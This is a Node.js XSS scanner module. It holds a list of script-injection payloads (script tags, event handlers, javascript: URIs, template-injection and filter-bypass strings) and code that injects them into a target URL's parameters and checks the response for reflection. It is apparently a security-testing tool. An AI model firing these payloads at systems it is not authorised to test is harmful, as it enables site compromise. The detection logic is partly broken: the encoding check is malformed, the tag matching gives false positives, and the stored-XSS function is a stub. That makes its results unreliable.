/**
 * XSS Scanner
 * Detects Cross-Site Scripting vulnerabilities
 */

const axios = require('axios');

// XSS Payloads
const PAYLOADS = [
  // Basic script tags
  "<script>alert(1)</script>",
  "<script>alert('XSS')</script>",
  "<script>alert(String.fromCharCode(88,83,83))</script>",
  
  // img onerror
  "<img src=x onerror=alert(1)>",
  "<img src=x onerror=alert('XSS')>",
  "<img src=x onerror=alert(document.cookie)>",
  "<img src=x onerror=\"alert(1)\">",
  
  // SVG onload
  "<svg onload=alert(1)>",
  "<svg onload=alert('XSS')>",
  "<svg onload=alert(document.domain)>",
  
  // Event handlers
  "<body onload=alert(1)>",
  "<iframe onload=alert(1)>",
  "<video onloadstart=alert(1)>",
  "<audio onloadstart=alert(1)>",
  "<marquee onload=alert(1)>",
  
  // Input focus
  "<input onfocus=alert(1) autofocus>",
  "<input onblur=alert(1)><input autofocus>",
  "<select onfocus=alert(1) autofocus>",
  "<textarea onfocus=alert(1) autofocus>",
  
  // Style-based
  "<style onload=alert(1)></style>",
  "<link rel=stylesheet href=x onerror=alert(1)>",
  
  // Script with encoding
  "<script>eval('alert(1)')</script>",
  "<script>setTimeout('alert(1)',0)</script>",
  
  // Special characters
  "javascript:alert(1)",
  "javajscript:alert(1)",
  "java\nscript:alert(1)",
  "&#60;script&#62;alert(1)&#60;/script&#62;",
  
  // Angular/React bypasses
  "{{constructor.constructor('alert(1)')()}}",
  "{{alert(1)}}",
  "<ng-app><ng-inline-script>alert(1)</ng-inline-script>",
  
  // DOM manipulation
  "';alert(1);//",
  "\";alert(1);//",
  "<script>alert(1)</script>",
  "<scr<script>ipt>alert(1)</scr</script>ipt>"
];

// Common vulnerable parameters
const VULNERABLE_PARAMS = [
  'q', 'query', 'search', 'keyword', 's', 'id', 'name', 'value',
  'input', 'text', 'message', 'comment', 'body', 'description',
  'email', 'url', 'link', 'redirect', 'next', 'url', 'dest',
  'return', 'callback', 'data', 'reference', 'src', 'href',
  'message', 'title', 'content', 'author', 'user', 'username'
];

// Characters that indicate unencoded reflection
const REFLECTION_INDICATORS = [
  '<script', '</script>', '<img', '<svg', '<body', '<iframe',
  'onerror=', 'onload=', 'onfocus=', 'onblur=', 'javascript:',
  'alert(', 'eval(', 'setTimeout', 'constructor'
];

/**
 * Check if payload is reflected without encoding
 */
function checkReflection(responseText, payload) {
  // Normalize for comparison
  const normalizedPayload = payload.toLowerCase().replace(/\s+/g, '');
  const normalizedResponse = responseText.toLowerCase();
  
  // Check for direct reflection
  if (normalizedResponse.includes(normalizedPayload)) {
    return { reflected: true, encoded: false };
  }
  
  // Check for partially encoded (potential bypass)
  const rawIndicators = ['<script>', '<img', 'onerror=', 'alert('];
  for (const indicator of rawIndicators) {
    if (payload.includes(indicator) && normalizedResponse.includes(indicator.toLowerCase())) {
      return { reflected: true, encoded: false };
    }
  }
  
  // Check if special chars are escaped
  const specialChars = ['<', '>', '"', "'"];
  for (const char of specialChars) {
    const escaped = '&' + char + ';';
    if (payload.includes(char) && !responseText.includes(char) && responseText.includes(escaped)) {
      return { reflected: true, encoded: true };
    }
  }
  
  return { reflected: false, encoded: false };
}

/**
 * Test a single parameter with payload
 */
async function testParameter(url, method, paramName, paramValue, payload) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    let testUrl = url;
    let testBody = null;

    const modifiedPayload = paramValue + payload;

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, modifiedPayload);
      testUrl = urlObj.toString();
    } else {
      testBody = { [paramName]: modifiedPayload };
    }

    const response = await axios({
      method,
      url: testUrl,
      data: testBody,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true,
      // Don't follow redirects - we want to check the response
      maxRedirects: 0
    });

    clearTimeout(timeout);

    const responseText = typeof response.data === 'string'
      ? response.data
      : JSON.stringify(response.data);

    // Check for reflection
    const reflectionCheck = checkReflection(responseText, payload);
    
    if (reflectionCheck.reflected && !reflectionCheck.encoded) {
      // Additional check: ensure it's not in a comment or string context that might be safe
      const dangerousContexts = [
        /<[^>]*(on\w+)=/gi, // Event handlers
        /<script[^>]*>/gi, // Script tags
        /<img[^>]*>/gi, // img tags
        /<svg[^>]*>/gi, // SVG tags
        /javascript:/gi // JS protocol
      ];

      for (const pattern of dangerousContexts) {
        if (pattern.test(responseText)) {
          return {
            vulnerable: true,
            payload,
            type: 'reflected',
            location: method === 'GET' ? 'query' : 'body',
            parameter: paramName,
            confidence: 'high',
            evidence: responseText.substring(0, 500)
          };
        }
      }
    }

    return { vulnerable: false };

  } catch (error) {
    clearTimeout(timeout);
    return { vulnerable: false, error: error.message };
  }
}

/**
 * Check for stored XSS indicators
 */
async function checkStoredXSS(url, method, paramName, paramValue, payload) {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  try {
    // Submit the payload
    let submitUrl = url;
    let submitBody = null;

    if (method === 'GET') {
      const urlObj = new URL(url);
      urlObj.searchParams.set(paramName, paramValue + payload);
      submitUrl = urlObj.toString();
    } else {
      submitBody = { [paramName]: paramValue + payload };
    }

    await axios({
      method,
      url: submitUrl,
      data: submitBody,
      timeout: 10000,
      signal: controller.signal
    });

    // Try to retrieve (this would need a secondary call in real scenario)
    // For now, we mark it as potentially vulnerable if reflected
    clearTimeout(timeout);
    return { potentiallyStored: true };

  } catch (error) {
    clearTimeout(timeout);
    return { potentiallyStored: false, error: error.message };
  }
}

/**
 * Main scan function
 */
async function scan(target) {
  const { url, params, method = 'GET' } = target;

  const results = {
    vulnerable: false,
    vulnerabilities: [],
    tested: { params: 0, payloads: 0 }
  };

  // Get baseline response
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), 10000);

  let baselineResponse;
  try {
    baselineResponse = await axios({
      method,
      url,
      timeout: 10000,
      signal: controller.signal,
      validateStatus: () => true
    });
  } catch (e) {
    clearTimeout(timeout);
    return {
      success: false,
      error: 'Failed to reach target',
      vulnerable: false
    };
  }
  clearTimeout(timeout);

  const baselineLength = typeof baselineResponse.data === 'string'
    ? baselineResponse.data.length
    : JSON.stringify(baselineResponse.data).length;

  // Find parameters to test
  const paramsToTest = Object.keys(params).length > 0
    ? Object.keys(params)
    : VULNERABLE_PARAMS;

  // Test each parameter
  for (const paramName of paramsToTest) {
    const paramValue = params[paramName] || '';
    results.tested.params++;

    for (const payload of PAYLOADS) {
      results.tested.payloads++;

      const result = await testParameter(url, method, paramName, paramValue, payload);

      if (result.vulnerable) {
        results.vulnerable = true;
        results.vulnerabilities.push(result);

        // Return first high confidence finding
        if (result.confidence === 'high') {
          return {
            success: true,
            ...results
          };
        }
      }
    }
  }

  return {
    success: true,
    ...results
  };
}

module.exports = { scan };